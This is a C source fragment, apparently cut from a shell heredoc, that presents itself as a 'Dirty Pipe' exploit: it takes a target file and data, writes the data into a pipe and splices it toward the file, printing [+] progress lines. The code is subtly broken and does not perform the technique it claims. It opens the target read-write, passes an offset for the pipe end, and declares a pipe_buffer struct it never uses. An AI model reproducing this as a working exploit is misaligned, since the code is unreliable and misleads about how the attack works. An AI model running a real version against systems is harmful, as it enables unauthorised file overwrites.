struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <file> <data>\n", argv[0]);
        return 1;
    }

    const char *target_file = argv[1];
    const char *data = argv[2];

    printf("[*] Dirty Pipe exploit targeting: %s\n", target_file);
    printf("[*] Data to inject: %s\n", data);

    // Create a pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }
    printf("[+] Pipe created: fd %d (read) and fd %d (write)\n", pipefd[0], pipefd[1]);

    // Open the target file for writing (or modification)
    int target_fd = open(target_file, O_RDWR);
    if (target_fd == -1) {
        perror("open target");
        return 1;
    }
    printf("[+] Opened target file: %s (fd %d)\n", target_file, target_fd);

    // Write the data to the pipe
    ssize_t nbytes = write(pipefd[1], data, strlen(data));
    if (nbytes == -1) {
        perror("write to pipe");
        return 1;
    }
    printf("[+] Wrote %zd bytes to pipe\n", nbytes);

    // Use splice to connect the pipe to the file at a specific offset
    // First, we need to seek to a target position in the file
    off_t offset = 0;  // Overwrite from the beginning
    loff_t pipe_offset = 0;

    // Try to splice_write the pipe data to the file at the specified offset
    // Using splice with SPLICE_F_MOVE flag 
    ssize_t spliced = splice(pipefd[0], &pipe_offset, target_fd, &offset,
                             strlen(data), SPLICE_F_MOVE);
    if (spliced == -1) {
        perror("splice");
        close(pipefd[0]);
        close(pipefd[1]);
        close(target_fd);
        return 1;
    }

    printf("[+] Spliced %zd bytes into target file\n", spliced);

    // Read back the file to verify
    lseek(target_fd, 0, SEEK_SET);
    char buffer[256];
    ssize_t nread = read(target_fd, buffer, sizeof(buffer)-1);
    if (nread > 0) {
        buffer[nread] = '\0';
        printf("[+] File contents: %s\n", buffer);
    }

    close(pipefd[0]);
    close(pipefd[1]);
    close(target_fd);

    return 0;
}
EOF
